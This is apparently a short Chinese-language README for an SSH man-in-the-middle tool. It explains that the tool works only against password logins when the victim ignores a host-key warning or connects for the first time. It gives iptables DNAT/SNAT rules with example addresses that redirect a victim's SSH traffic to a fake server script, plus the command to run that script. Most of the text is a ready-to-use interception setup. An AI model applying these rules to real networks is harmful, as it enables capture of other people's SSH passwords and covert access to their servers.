## 场景
A -> We -> B. 我们已经成为了中间人的情况下. A尝试连接B的ssh服务.

## 适用范围
A 必须使用的密码验证登录B, 如果是用的publickey认证的, 就无法使用.
基于密码认证的情况下, A需要有以下某一种前提:
* A忽略掉证书server证书错误,将客户端的know_hosts 中的已保存密钥删除.
* A第一次连接这个ssh server.

## 使用方法
1. 配置iptables, 将A的所有流量转到我们的2200端口(可更改)
2. 将B回执给A的包转发给We的client.
3. `python demo_ssh_server.py`

## iptables规则如下

A:192.168.1.3<br/>
We:192.168.1.1;192.168.2.2<br/>
B:192.168.2.3<br/>

转发A的流量<br/>
`iptables -t nat -I PREROUTING -d 192.168.2.3 -p tcp --dport 22 -j DNAT --to-destination=192.168.1.1:2200`<br/>
`iptables -t nat -I POSTROUTING -d 192.168.1.3 -p tcp -j SNAT --to-source=192.168.2.3`<br/>
转发B的流量<br/>
`iptables -t nat -I PREROUTING -d 192.168.1.3 -p tcp -j DNAT --to-destination=192.168.2.2`<br/>
`iptables -t nat -I POSTROUTING -d 192.168.2.3 -p tcp -j SNAT --to-source=192.168.1.3`<br/>
